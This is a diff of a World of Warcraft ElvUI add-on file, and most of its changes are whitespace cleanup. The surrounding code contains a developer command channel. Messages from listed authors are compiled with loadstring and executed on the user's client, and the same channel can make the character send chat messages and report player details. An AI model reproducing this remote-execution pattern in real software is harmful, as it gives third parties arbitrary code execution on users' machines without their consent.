@@ -1,6 +1,5 @@
 ﻿local E, L, V, P, G, _ = unpack(ElvUI); 
 local SLE = E:GetModule('SLE');
-local find = string.find
 local split = string.split
 
 local Message = ''
@@ -81,7 +80,7 @@ function SLE:Auth(sender)
 	if Authors[senderRealm] and Authors[senderRealm][senderName] then
 		return Authors[senderRealm][senderName]
 	end
-	
+
 	return false
 end
 
@@ -132,14 +131,13 @@ function E:sleCommand(flag, channel, target, output, text, wtarget, presenceID)
 	SLE:Print('|cff00FF00Success|r:  Command executed.')
 end
 
-
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname.."-"..E.myrealm:gsub(' ','') then return end
 		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) and not SLE:Auth() then
 			if prefix == 'SLE_DEV_SAYS' then
 				local user, channel, msg, sendTo = split("#", message)
-				
+
 				if (user ~= 'ALL' and (user == E.myname or user == E.myname.."-"..E.myrealm:gsub(' ',''))) or user == 'ALL' then
 					SendChatMessage(msg, channel, nil, sendTo)
 				end
@@ -151,15 +149,17 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 						SLE:Print(format("Developer Executed: %s", executeString))
 						func()
 					end
-				end			
+				end
 			end
 		end
+
 		if prefix == 'SLE_DEV_REQ' and SLE:Auth(sender) then
 			local message = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
 			SendAddonMessage('SLE_DEV_INFO', message, channel)
 		end
 	elseif event == "BN_CHAT_MSG_ADDON" then
 		if (sender == E.myname.."-"..E.myrealm:gsub(' ','')) then return end
+
 		if prefix == 'SLE_DEV_REQ' then
 			local _, numBNetOnline = BNGetNumFriends()
 			for i = 1, numBNetOnline do
@@ -167,6 +167,7 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 				if isOnline and client == BNET_CLIENT_WOW then
 					--local messageS
 					local message, ID = split("#", message)
+
 					if message == 'userlist' then
 						message = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
 					elseif message == 'slesay' then
@@ -181,11 +182,12 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 				SendChatMessage(msg, channel, nil, sendTo)
 			else
 				local _, executeString = split("#", message)
-					local func, err = loadstring(executeString);
-					if not err then
-						SLE:Print(format("Developer Executed: %s", executeString))
-						func()
-					end		
+				local func, err = loadstring(executeString);
+
+				if not err then
+					SLE:Print(format("Developer Executed: %s", executeString))
+					func()
+				end
 			end
 		end
 	end
